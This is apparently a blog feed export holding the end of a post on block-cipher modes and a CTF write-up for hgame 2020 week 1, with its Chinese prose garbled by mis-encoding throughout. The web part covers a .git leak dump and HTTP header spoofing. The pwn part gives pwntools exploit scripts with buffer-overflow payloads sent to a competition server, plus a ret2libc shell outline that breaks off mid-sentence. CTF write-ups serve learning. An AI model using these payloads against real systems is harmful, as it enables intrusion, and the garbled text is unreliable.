ä¸ºè®¡æ•°å™¨æ¨¡å¼ä¸éœ€è¦ä»»ä½•åé¦ˆï¼Œè¿™ä¸OFBæˆ–CFBæ¨¡å¼å®Œå…¨ä¸åŒã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥è®©ä¸¤ä¸ªåˆ†ç»„å¯†ç å¼•æ“åŒæ—¶å¹¶è¡Œå·¥ä½œï¼Œå³è®©ä¸¤ä¸ªå¼•æ“åŒæ—¶ä½¿ç”¨ç¬¬ä¸€ä¸ªåˆ†ç»„å¯†ç åŠ å¯†è®¡æ•°å™¨å€¼CTRå’ŒCTR2ã€‚ ç­‰è¿™ä¸¤ä¸ªåˆ†ç»„å¯†ç å¼•æ“å®Œæˆåï¼Œç¬¬ä¸€ä¸ªå¼•æ“å°†ç»§ç»­åŠ å¯†å€¼CTR3,è€Œå¦ä¸€ä¸ªå¼•æ“åˆ™ç»§ç»­åŠ å¯†CTR,å¦‚æ­¤å¾ªç¯ã€‚</p><p>&emsp;&emsp;è¿™ç§æ–¹æ¡ˆçš„åŠ å¯†é€Ÿç‡æ˜¯å•ä¸ªå®ç°æ–¹å¼çš„ä¸¤å€ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥åŒæ—¶è¿è¡Œå¤šä¸ªåˆ†ç»„å¯†ç å¼•æ“ï¼Œè¿™ä¹Ÿä¼šä½¿åŠ å¯†é€Ÿç‡æŒ‰æ¯”ä¾‹å¢åŠ ã€‚å¯¹ååç‡è¦æ±‚ä¸¥æ ¼çš„åº”ç”¨è€Œè¨€ï¼Œæ¯”å¦‚åœ¨è¦æ±‚å‡ Gb/sæ•°æ®ç‡çš„ç½‘ç»œä¸­ï¼Œå¹¶è¡ŒåŒ–çš„åŠ å¯†æ¨¡å¼éå¸¸åˆé€‚ã€‚</p><h5 id="ç¼ºé™·-4"><a href="#ç¼ºé™·-4" class="headerlink" title="ç¼ºé™·"></a>ç¼ºé™·</h5><p>ä¸OFBæ¨¡å¼ç›¸åŒï¼Œé™ä½äº†åè½¬å­—èŠ‚è¿™æ ·çš„ä¸»åŠ¨æ”»å‡»çš„æˆæœ¬ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>&emsp;&emsp;æ€»çš„æ¥è¯´ï¼Œæ„Ÿè§‰ç°åœ¨ç”¨çš„æ¯”è¾ƒå¤šçš„è¿˜æ˜¯CBCåŠ å¯†æ¨¡å¼ï¼ŒCTFä¸­OFBåŠ å¯†æ¨¡å¼å’ŒCTRåŠ å¯†æ¨¡å¼çš„èµ›é¢˜ä¹Ÿä¸å¸¸è§ã€‚</p><p>&emsp;&emsp;ä½†å¯¹åˆ†ç»„åŠ å¯†çš„äº”ç§ä¸»æµåŠ å¯†æ¨¡å¼åŠå…¶ä¸€äº›æ”»å‡»æ‰‹æ³•çš„å­¦ä¹ ï¼Œå¯ä»¥è®©æˆ‘ä»¬äº†è§£è¿™äº”ç§æ¨¡å¼çš„å„è‡ªçš„ä¼˜ç¼ºç‚¹ï¼Œè¿™æ ·ï¼Œå°±ç®—åœ¨ä»¥åçš„CTFçš„èµ›é¢˜ä¸­é‡åˆ°ï¼Œæˆ‘ä»¬ä¹Ÿå¥½æœ‰çš„æ”¾çŸ¢ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>ã€Šæ·±å…¥æµ…å‡ºå¯†ç å­¦â€”â€”å¸¸ç”¨åŠ å¯†æŠ€æœ¯åŸç†ä¸åº”ç”¨ã€‹ï¼ˆæ¸…åå¤§å­¦å‡ºç‰ˆç¤¾ï¼‰</p><p> <a href="https://blog.csdn.net/csu_vc/article/details/79619309" target="_blank" rel="noopener">https://blog.csdn.net/csu_vc/article/details/79619309</a> </p><p> <a href="https://blog.csdn.net/chengqiuming/article/details/82355772" target="_blank" rel="noopener">https://blog.csdn.net/chengqiuming/article/details/82355772</a> </p><p> <a href="https://www.dazhuanlan.com/2019/09/02/5d6c9d6f823a7/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/09/02/5d6c9d6f823a7/</a> </p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Block </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ“ä½œæ¨¡å¼ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 hgame week1</title>
      <link href="/2020/02/18/2020hgame_week1/"/>
      <url>/2020/02/18/2020hgame_week1/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h2><p>â€‹        2020hgameå¼€å§‹äº†ï¼Œä½œä¸ºè‡ª2019hgameå…¥æ‰‹ctfçš„èŒæ–°ï¼Œåˆæ¥hgameå­¦ä¹ äº†ã€‚è¿™ä¸€æ¬¡çš„week1æ„Ÿè§‰æ¯”å»å¹´åˆéš¾äº†ä¸€ä¸ªæ¡£æ¬¡ï¼Œä¸è¿‡èŠ±äº†å››å¤©æ‘¸çˆ¬æ»šæ‰“ï¼Œè¿è’™å¸¦çŒœï¼Œç»ˆäºæ˜¯aakäº†ï¼Œè¿™é‡Œç•™ä¸‹è¯¦ç»†wpä»¥ä¾›å­¦ä¹ ã€‚å…¶ä¸­äºŒè¿›åˆ¶æ–¹å‘æ˜¯æœ€è¿‘æ‰å¼€å§‹æ¥è§¦çš„ï¼Œè‹¥æœ‰ä¸å½“ä¹‹å¤„ï¼Œæœ›æŒ‡æ­£ã€‚</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Cosmosçš„åšå®¢"><a href="#Cosmosçš„åšå®¢" class="headerlink" title="Cosmosçš„åšå®¢"></a>Cosmosçš„åšå®¢</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š"><a href="#é¢˜ç›®ä»‹ç»ï¼š" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>Cosmos çš„åšå®¢</p><p>ä½ å¥½ã€‚æ¬¢è¿ä½ æ¥åˆ°æˆ‘çš„åšå®¢ã€‚</p><p>å¤§èŒ„å­è®©æˆ‘æŠŠ flag è—åœ¨æˆ‘çš„è¿™ä¸ªåšå®¢é‡Œã€‚ä½†æˆ‘å‰å‰ååæ”¹äº†å¾ˆå¤šéï¼Œè¿˜æ˜¯è§‰å¾—ä¸æ»¡æ„ã€‚ä¸è¿‡æœ‰å¤§èŒ„å­å‘Šè¯‰æˆ‘çš„<strong>ç‰ˆæœ¬ç®¡ç†å·¥å…·</strong>ä»¥åŠ GitHubï¼Œæˆ‘æ”¹èµ·æ¥ä¹ŸæŒºæ–¹ä¾¿çš„ã€‚</p><h4 id="è§£é¢˜æ€è·¯ï¼š"><a href="#è§£é¢˜æ€è·¯ï¼š" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>é€šè¿‡é¢˜é¢ä¸­æåˆ°çš„githubå¯ä»¥æƒ³åˆ°å¯èƒ½æ˜¯.gitæ³„éœ²</p><p>äºæ˜¯åˆ©ç”¨å·¥å…·git_extractï¼š <a href="https://github.com/gakki429/Git_Extract" target="_blank" rel="noopener">https://github.com/gakki429/Git_Extract</a> </p><p>å¯ä»¥dumpåˆ°.gitæ–‡ä»¶ï¼Œ</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python git_extract<span class="selector-class">.py</span> http:<span class="comment">//cosmos.hgame.n3ko.co/.git/</span></span><br></pre></td></tr></table></figure><p>åœ¨å…¶ä¸­çš„configæ–‡ä»¶é‡Œé¢æœ‰ä¸€ä¸ªgithubé¡¹ç›®çš„ç½‘å€</p><p>è¿›å…¥é¡µé¢ç‚¹å‡»äººååˆ°commitï¼Œ</p><p>ç‚¹æœ€ä¸‹é¢çš„é¡¹ç›®</p><p>è·å¾—flagçš„base64ï¼Œ</p><p>è§£ç å³å¯</p><p>flagï¼šhgame{g1t_le@k_1s_danger0us_!!!!}</p><h3 id="æ¥å¤´éœ¸ç‹"><a href="#æ¥å¤´éœ¸ç‹" class="headerlink" title="æ¥å¤´éœ¸ç‹"></a>æ¥å¤´éœ¸ç‹</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-1"><a href="#é¢˜ç›®ä»‹ç»ï¼š-1" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>HGAME Re:Dive å¼€æœå•¦~</p><h4 id="è§£é¢˜æ€è·¯ï¼š-1"><a href="#è§£é¢˜æ€è·¯ï¼š-1" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>ä»åå­—å¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸€é¢˜çš„è€ƒç‚¹æ˜¯æŠ¥æ–‡å¤´ï¼Œæ‰€ä»¥å¼€å¥½burpsuitï¼Œç›´æ¥æŠ“åŒ…</p><p>step1ï¼šYou need to come from  <a href="https://vidar.club/" target="_blank" rel="noopener">https://vidar.club/</a></p><p>è¿›è¡Œrefererä¼ªé€ ï¼Œ</p><p>Referer: <a href="https://vidar.club/" target="_blank" rel="noopener">https://vidar.club/</a></p><p>step2ï¼šYou need to visit it locally.</p><p>è¿›è¡Œipä¼ªé€ ï¼š</p><p>x-forwarded-for: 127.0.0.1</p><p>step3:You need to use Cosmos Brower to visit.</p><p>è¿›è¡ŒUAä¼ªé€ ï¼šUser-Agent: Cosmos Brower    ï¼ˆå‡ºé¢˜äººæ‹¼é”™å•è¯23333ï¼‰</p><p>step4ï¼šYour should use POST method :)</p><p>æ›´æ”¹è¯·æ±‚æ–¹å¼ä½POSTï¼š</p><p>step5ï¼šThe flag will be updated after 2077, please wait for it patiently.</p><p>é¢˜é¢è¯´flagåœ¨2077å¹´ä¼šupdatedä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¯·æ±‚åœ¨2077å¹´ä¹‹åä¸å†æ›´æ–°çš„èµ„æº</p><p>If-Unmodified-Since: Fri, 01 Oct 2077 00:00:00 GMT</p><p>å¾—åˆ°flagï¼šhgame{W0w!Your_heads_@re_s0_many!}</p><h3 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-2"><a href="#é¢˜ç›®ä»‹ç»ï¼š-2" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>Code is exciting!<br>å‚æ•°açš„æäº¤æ ¼å¼ä¸º: ä¸¤æ•°ç›¸åŠ (a=b+c)</p><h4 id="è§£é¢˜æ€è·¯ï¼š-2"><a href="#è§£é¢˜æ€è·¯ï¼š-2" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>è¿™é“é¢˜ä¸€è¿›å»å°±ä¼šé‡å®šå‘åˆ°ä¸€ä¸ªnew.php</p><p>å¥½å¤šæ–°äººè®¤ä¸ºæ˜¯é¢˜ç›®çš„é—®é¢˜ï¼Œä»¥ä¸ºé¢˜ç›®ç‚¸äº†ï¼Œå…¶å®æ‰“å¼€f12å¯ä»¥çœ‹è§ã€‚è¢«302é‡å®šå‘äº†</p><p>æ‰€ä»¥æˆ‘ä»¬burpsuitæŠ“åŒ…æ‹¦æˆªï¼Œ</p><p>å‘ç°405Not Allowedï¼Œ</p><p>è¿™é‡Œå¹¶æ²¡æœ‰å‘ç°ä»»ä½•åˆ¤æ–­èº«ä»½çš„å‚æ•°ï¼Œæœ€åå°è¯•æ›´æ”¹è¯·æ±‚æ–¹å¼ä¸ºPOST</p><p>é¢˜é¢çš„æ„æ€æ˜¯è®©æˆ‘ä»¬é€šè¿‡å‚æ•°aè®¡ç®—ä¸¤æ•°ä¹‹å’Œï¼Œ</p><p>è¯•ç€æäº¤ï¼Œa=1+9</p><p>å‘ç°å¤±è´¥äº†ï¼Œå› ä¸ºurlä¸­ã€‚â€˜+â€™å…¶å®è¡¨ç¤ºç©ºæ ¼ï¼Œè¿™é‡Œæˆ‘ä»¬å°†â€˜+â€™ç¼–ç ï¼Œurlencodeåï¼Œä¼ è¿‡å»ï¼Œ</p><p>payloadï¼š?a=1%2b9</p><p>flag:hgame{C0d3_1s_s0_S@_sO_C0ol!}</p><h3 id="ğŸ”å°¼æ³°ç«"><a href="#ğŸ”å°¼æ³°ç«" class="headerlink" title="ğŸ”å°¼æ³°ç«"></a>ğŸ”å°¼æ³°ç«</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-3"><a href="#é¢˜ç›®ä»‹ç»ï¼š-3" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>å¬è¯´ä½ çƒæŠ€é«˜è¶…ï¼Ÿ</p><h4 id="è§£é¢˜æ€è·¯ï¼š-3"><a href="#è§£é¢˜æ€è·¯ï¼š-3" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>è¿›å…¥é¡µé¢ï¼Œæ˜¯ä¸ªæ‰“ç –å—çš„æ¸¸æˆï¼Œç›²çŒœæ˜¯ä½œå¼Šè¯¥åˆ†æ•°äº†ã€‚</p><p>burpsuitå¼€å¯æ‹¦æˆªï¼Œéšä¾¿ç©ä¸‹ï¼Œè¾“æ‰æ¸¸æˆåå¯ä»¥æŠ“åˆ°åŒ…</p><p>æŠŠé‡Œçš„åˆ†æ•°ï¼š2000ï¼Œæ”¹æ‰ã€‚éšä¾¿æ¥ä¸ªå¤§ä¸€ç‚¹çš„</p><p>å¾—åˆ°flagï¼šhgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-4"><a href="#é¢˜ç›®ä»‹ç»ï¼š-4" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>æ— è„‘AAAå¤ªæ— èŠäº†ï¼ŒæŒ‘æˆ˜æ›´é«˜éš¾åº¦çš„æ— è„‘AAAï¼<br>nc 47.103.214.163 20000</p><h4 id="è§£é¢˜æ€è·¯ï¼š-4"><a href="#è§£é¢˜æ€è·¯ï¼š-4" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>é™æ€åˆ†ææ ¸å¿ƒä»£ç </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+7Bh] [ebp-31h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+A0h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+A4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  alarm(<span class="number">8u</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0xA0</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's 0O0o\\0O0!"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(<span class="string">"0O0o"</span>, &amp;v5, <span class="number">7u</span>) )</span><br><span class="line">    backdoor();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å­˜åœ¨å±é™©å‡½æ•°getsï¼Œæ‰€ä»¥ä¼šæœ‰æº¢å‡ºï¼Œ</p><p>è¿™é‡Œæœ‰ä¸ªå‘ï¼Œå°±æ˜¯ä¼ªä»£ç æ¢å¤æ¥çš„éœ€è¦æ¯”è¾ƒçš„å­—ç¬¦åªæœ‰0O0oï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°åˆè¦æ¯”è¾ƒ7ä¸ªå­—ç¬¦ï¼Œ</p><p>æˆ‘ä»¬ç›´æ¥å».rodataæ®µçœ‹</p><p>è¿˜æ˜¯åªæœ‰å…­ä¸ªå­—ç¬¦ï¼Œï¼Œemmmï¼Œé‚£å°±æŒ‰Dï¼Œè½¬Data</p><p>è¿™è¦å°±çŸ¥é“ä¸ºå•¥åç¼–è¯‘ä¹‹ååªç»™äº†4ä¸ªå­—ç¬¦äº†ï¼Œå› ä¸ºå½“ä¸­æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²æˆªæ–­ç¬¦å·ï¼Œ\x00ï¼Œ</p><p>æ‰€ä»¥çœŸæ­£è¦æ¯”è¾ƒçš„å­—ç¬¦ä¸²å°±æ˜¯0O0o\x00O0</p><p>ç„¶åå†çœ‹è¦è¢«æ¯”è¾ƒçš„å­—ç¬¦ä¸²v5çš„èµ·å§‹åœ°å€</p><p>æ¥å—æˆ‘ä»¬è¾“å…¥çš„åœ°å€æ˜¯&amp;s</p><p>æ‰€ä»¥ä¸­é—´çš„å¡«å……å­—ç¬¦çš„æ•°é‡å°±æ˜¯0xAC-0x31</p><p>ç”»ä¸ªå›¾å°±æ˜¯</p><p><img src="https://i.loli.net/2020/04/30/tpTBCkHQNwmiSsO.png" alt="img"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="built_in">import</span> *</span><br><span class="line">context.<span class="attr">log_level</span> = <span class="string">"debug"</span></span><br><span class="line"><span class="attr">elf</span> = ELF(<span class="string">"Hard_AAAAA"</span>)</span><br><span class="line"></span><br><span class="line">def pwn(url,port,debug):</span><br><span class="line">    <span class="keyword">if</span> (<span class="attr">debug==1):</span></span><br><span class="line">        <span class="attr">sh</span> = process('./Hard_AAAAA')</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="attr">sh</span> = remote(url,port)</span><br><span class="line">    sh.recvuntil(<span class="string">"Let's 0O0o\\0O0!\n"</span>)</span><br><span class="line">    <span class="attr">payload</span> = <span class="string">"a"</span>* (<span class="number">0</span>xAC-<span class="number">0</span>x31)</span><br><span class="line">    payload+=<span class="string">"0O0o\x00O0"</span></span><br><span class="line">   <span class="comment"># gdb.attach(sh)</span></span><br><span class="line">   <span class="comment"># pause()</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"47.103.214.163"</span>,<span class="string">"20000"</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="One-shot"><a href="#One-shot" class="headerlink" title="One_shot"></a>One_shot</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-5"><a href="#é¢˜ç›®ä»‹ç»ï¼š-5" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>ä¸€å‘å…¥é­‚</p><h4 id="è§£é¢˜æ€è·¯ï¼š-5"><a href="#è§£é¢˜æ€è·¯ï¼š-5" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œçš„nameå¯ä»¥è¾“å‡º32ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬çœ‹çœ‹æ ˆé‡Œçš„å¸ƒç½®</p><p><img src="https://i.loli.net/2020/04/30/oQhTVYBbSUEfNX9.png" alt="img"></p><p>å¯ä»¥å‘ç°ï¼Œ0xE0-0xC0 åˆšå¥½ç­‰äº32</p><p>æ‰€ä»¥ï¼Œè¾“å…¥32ä¸ªå­—èŠ‚é•¿çš„nameåï¼ŒæŒ‰ç†è¯´nameå’Œflagå°±æ‹¼æ¥åœ¨ä¸€èµ·äº†ï¼Œ</p><p>ä½†æ˜¯å­—ç¬¦ä¸²ä¼šåœ¨æœ€ååŠ ä¸€ä¸ªæˆªæ–­ç¬¦\x00,æ‰€ä»¥ä¹Ÿå°±æ˜¯flagçš„ç¬¬ä¸€ä½ä¼šè¢«æˆªæ–­ç¬¦ç»™è¦†ç›–</p><p>è¿™é‡Œç¨‹åºè´´å¿ƒçš„ç»™äº†ä¸€ä¸ªä¿®æ”¹æŒ‡å®šåœ°å€çš„å€¼ä¸º1çš„åŠŸèƒ½</p><p>æ‰€ä»¥æˆ‘ä»¬è¾“å…¥åœ°å€ï¼š00000000006010E0ï¼ŒæŠŠè¿™ä¸ªæˆªæ–­ç¬¦ç»™æ”¹äº†ï¼Œ</p><p>é‚£ä¹ˆç¨‹åºæœ‰ä¸€ä¸ªè¾“å‡ºnameçš„åŠŸèƒ½ï¼Œè¾“å‡ºnameæ—¶ï¼Œç”±äºnameå’Œflagå·²ç»æ‹¼æ¥åœ¨ä¸€èµ·äº†ï¼Œå°±ä¼šè¿ç€flagä¸€èµ·è¾“å‡ºå‡ºæ¥ï¼Œå½“ç„¶ï¼Œflagçš„ç¬¬ä¸€ä½å·²ç»è¢«æ•°å­—1ç»™è¦†ç›–äº†ï¼Œä½†æ˜¯ä¸è¦ç´§ï¼Œæ˜¾ç„¶flagçš„ç¬¬ä¸€ä½å°±æ˜¯â€™hâ€™</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">elf = ELF(<span class="string">"One_Shot"</span>)</span><br><span class="line"></span><br><span class="line">def pwn(url,port,<span class="keyword">debug</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">debug</span>==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">sh</span> = process(<span class="string">'./One_Shot'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">sh</span> = remote(url,port)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"name?\n"</span>)</span><br><span class="line">    payload = <span class="string">"a"</span>* <span class="number">32</span></span><br><span class="line">    <span class="keyword">sh</span>.send(payload)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"shot!\n"</span>)</span><br><span class="line">    addr = <span class="keyword">int</span>(<span class="string">"0x6010E0"</span>,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(addr))</span><br><span class="line">    flag=<span class="keyword">sh</span>.recv()</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line">   # gdb.attach(<span class="keyword">sh</span>)</span><br><span class="line">   # pause()</span><br><span class="line">    <span class="keyword">sh</span>.interactive()</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"47.103.214.163"</span>,<span class="string">"20002"</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="Number-Killer"><a href="#Number-Killer" class="headerlink" title="Number_Killer"></a>Number_Killer</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-6"><a href="#é¢˜ç›®ä»‹ç»ï¼š-6" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>çœ‹èµ·æ¥äººç•œæ— å®³çš„ä¸€äº›æ•´æ•°ä¹Ÿèƒ½ç§’æˆ‘ï¼Ÿ(åƒæƒŠ)<br>nc 47.103.214.163 20001</p><h4 id="è§£é¢˜æ€è·¯ï¼š-6"><a href="#è§£é¢˜æ€è·¯ï¼š-6" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>readå‡½æ•°çš„åŠŸèƒ½å°±æ˜¯è¯»å…¥ï¼Œè¿”å›20ä¸ªæ•°å­—</p><p>è¿™é‡Œ20ä¸ªæ•°å­—æœ€å¤šå 8å­—èŠ‚</p><p>å¹¶ä¸”æ•°ç»„çš„å®šä¹‰æ˜¯__int64ï¼Œ64ä½ä¸‹ï¼Œæ•°ç»„çš„æ¯ä¸ªå…ƒç´ å°±å 8ä¸ªå­—èŠ‚äº†ã€‚</p><p>æˆ‘ä»¬çœ‹åˆ°ï¼Œæ•°ç»„v4æœ€å¤šå¯ä»¥å­˜11ä¸ªæ•°å­—ï¼Œä½†æ˜¯åœ¨å¾ªç¯è¯»å…¥çš„æ—¶å€™å´è¯»äº†20ä¸ªæ•°ï¼Œè¿™é‡Œæ˜¾ç„¶æœ‰æ•°ç»„è¶Šç•Œã€‚</p><p>æˆ‘ä»¬åœ¨çœ‹ä¸€ä¸‹æ ˆ</p><p><img src="https://i.loli.net/2020/04/30/51KHsVeqZRjotS8.png" alt="img"></p><p>æ•°ç»„çš„åœ°å€æ—¶ï¼Œ-60åˆ°-08ï¼Œè¿™ä¸ªvar_4æ˜¯içš„åœ°å€ã€‚</p><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨è¯»å…¥20ä¸ªæ•°æ®çš„æ—¶å€™ï¼Œæ•°ç»„ä¼šè¶Šç•Œï¼Œå¹¶ä¸”è¿˜ä¼šè¦†ç›–i çš„å€¼ã€‚</p><p>ç”±äºç¨‹åºä¸­æ˜¯æ ¹æ®iå¾—å€¼æ¥ç®—åœ°å€ï¼Œæ¥å†™å…¥æˆ‘ä»¬å¾—è¾“å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ§åˆ¶içš„å€¼ã€‚</p><p>æŠ›å¼€è¿™äº›ä¸è¯´ï¼Œè¶Šç•Œäº†ä¹‹ååˆèƒ½å¹²ä»€ä¹ˆå‘¢ï¼Ÿè¿™é‡Œæœ‰ä¸€ç§ret2libcçš„åˆ©ç”¨æ–¹å¼</p><p>å‚è€ƒè¿™ç¯‡<a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">æ–‡ç« </a></p><p>æº¢å‡ºåæˆ‘ä»¬å…ˆåˆ©ç”¨Ropgadget æ‰¾åˆ° pop edi;ret çš„åœ°å€ï¼Œç„¶ååˆ©ç”¨libcé‡Œçš„systemå‡½æ•°ï¼Œ/bin/shå­—ç¬¦ä¸²æ¥getshell</p><p>åŸç†åœ¨ä¸Šé¢çš„æ–‡ç« è®²çš„æ¯”è¾ƒæ¸…æ¥šã€‚è¿™é‡Œä»‹ç»å…·ä½“æ“ä½œï¼š</p><p>åˆ©ç”¨Ropgadget æ‰¾åˆ° pop edi;ret çš„åœ°å€</p><p>ç„¶åçœ‹çœ‹ç¨‹åºçš„libcçš„ç‰ˆæœ¬</p><p><img src="https://i.loli.net/2020/04/30/kfPgrNQFXHmcYlp.png" alt="img"></p><p>ï¼ˆæ‰“è¿œç¨‹çš„æ—¶å€™è¿˜å¾—çŸ¥é“è¿œç¨‹ç¯å¢ƒçš„ubuntuç‰ˆæœ¬ï¼Œ16.04ï¼Œ18.04è¿˜æ˜¯ä¸çŸ¥é“çš„ï¼Œä½†æ˜¯ï¼Œå…¶å®æœ‰libcsearcherè¿™æ 